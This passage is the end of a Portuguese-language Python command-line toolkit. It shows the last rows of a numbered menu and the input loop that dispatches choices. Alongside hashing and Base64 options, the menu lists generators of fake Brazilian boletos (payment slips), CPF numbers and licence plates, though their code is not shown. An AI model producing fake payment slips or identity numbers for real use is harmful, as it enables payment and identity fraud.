{C}[48]{RS} SHA256 Hash         {C}[58]{RS} Boleto Fake
{C}[49]{RS} Base64 Encode       {C}[59]{RS} CPF Fake
{C}[50]{RS} Base64 Decode       {C}[60]{RS} Placa Fake

{Y}══════════════════════════════════════════════════════════════════════════{RS}
""")
        opcao = input(f"{Y}Digite o número do comando (0 para sair): {RS}")

        if opcao == "0" or opcao == "62":
            print(f"{G}[+] Saindo...{RS}")
            sys.exit(0)
        elif opcao in comandos:
            try:
                comandos[opcao]()
            except Exception as e:
                print(f"{R}[!] Erro: {e}{RS}")
                pausa()
        else:
            print(f"{R}[!] Opção inválida{RS}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Saindo...{RS}")
        sys.exit(0)
    except Exception as e:
        print(f"{R}[!] Erro: {e}{RS}")
